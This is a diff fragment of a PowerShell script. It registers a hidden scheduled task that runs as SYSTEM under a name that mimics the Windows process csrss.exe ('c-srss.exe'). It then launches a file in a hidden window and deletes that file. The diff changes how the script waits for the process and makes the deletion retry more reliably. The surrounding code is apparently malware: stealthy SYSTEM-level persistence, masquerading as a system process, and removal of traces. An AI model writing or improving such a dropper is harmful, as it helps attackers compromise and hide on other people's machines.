@@ -62,12 +62,17 @@ if (Test-Path $output1) {
         $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
         Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Hidden c-srss.exe Task" -Settings (New-ScheduledTaskSettingsSet -Hidden) | Out-Null
     }
-    Start-Process -FilePath $output1 -WindowStyle Hidden -Wait
+    $proc = Start-Process -FilePath $output1 -WindowStyle Hidden -PassThru
+    $proc.WaitForExit()
     $maxTries = 5
     for ($i=1; $i -le $maxTries; $i++) {
         try {
-            Remove-Item $output1 -Force -ErrorAction Stop
-            break
+            if (Test-Path $output1) {
+                Remove-Item $output1 -Force -ErrorAction Stop
+                if (-not (Test-Path $output1)) { break }
+            } else {
+                break
+            }
         } catch {
             Start-Sleep -Seconds 2
         }
